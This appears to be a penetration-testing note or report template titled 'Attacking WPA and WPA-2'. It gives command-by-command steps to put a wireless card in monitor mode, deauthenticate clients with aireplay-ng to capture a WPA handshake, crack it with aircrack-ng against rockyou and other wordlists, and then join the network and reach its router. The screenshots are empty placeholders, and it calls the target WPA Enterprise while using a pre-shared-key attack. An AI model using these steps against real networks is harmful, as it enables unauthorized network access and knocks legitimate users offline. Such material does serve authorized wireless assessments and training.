# Attacking WPA and WPA-2

1. Run an `airodump-ng`  scan: 

```
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band abg
```

We find our WPA Enterprise network of interest:

**Screenshot of initial airodump screenshot goes here:  
**![](image.png)

  

  

2. We try a more targeted scan: 

```
sudo airodump-ng wlan0mon --bssid <BSSID>  --channel <CHANNEL> -w <FILE_PREFIX> --output-format pcap
```

**Screenshot of targeted airodump goes here:**

![](image.png)

  

  

3. If there are any clients, we can attempt to de-authenticate them all: 

```
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon

```

  

  

4. We see that we get a WPA handshake during our `airodump-ng`  scan: 

**Screenshot of 4-way handshake:**

![](image.png)

  

  

5. We can conclude the `airodump-ng`  scan and we can proceed to crack the 4-way handshake. 

```
sudo aircrack-ng <PCAP FILE> -w /usr/share/wordlists/rockyou.txt

sudo aircrack-ng <PCAP FILE> -w /usr/share/john/password.lst
```

**Screenshot of cracking 4-way handshake:**

![](image.png)

  

  

6. After cracking the password, we can include the password inside of the network configuration file: 

  

- WiFi configuration file we can save as `wpa.conf` 

```
network={
  ssid="<SSID>"
  key_mgmt=WPA-PSK
  psk="<PASSWORD>"
  proto=RSN
}

```

  

- Connect to the wireless network with that configuration file: 

```
sudo wpa_supplicant -D nl80211 -i wlan0 -c wpa.conf 

```

  

In a separate terminal, we can grab another IP address via DHCP:

```
sudo dhclient wlan0 -v
```

  

  

7. We confirm that we are on the network: 

```
iwconfig
```

**Screenshot of the wireless interface**

![](image.png)


8. We browse to the router endpoint IP `x.x.x.1` in the browser: 

```
firefox x.x.x.1
```  
